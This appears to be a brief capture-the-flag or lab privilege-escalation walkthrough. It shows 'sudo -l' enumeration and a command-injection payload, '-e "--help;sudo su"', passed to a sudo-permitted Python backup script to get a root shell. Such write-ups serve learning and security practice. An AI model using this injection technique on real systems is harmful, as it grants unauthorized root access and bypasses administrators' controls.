
sudo -l

<img width="796" alt="image" src="https://user-images.githubusercontent.com/59768512/167270262-887ad0d2-eedc-48c9-a667-8a5d37d74742.png">

can run sudo /usr/bin/python3 /home/user/safe_backup.py with args

see safe_backup.py

<img width="870" alt="image" src="https://user-images.githubusercontent.com/59768512/167270179-3574d9be-a110-491c-8208-d4e76893d452.png">

command injection


--help to statisfy tar 
sudo /usr/bin/python3 /home/user/safe_backup.py -e "--help;sudo su"
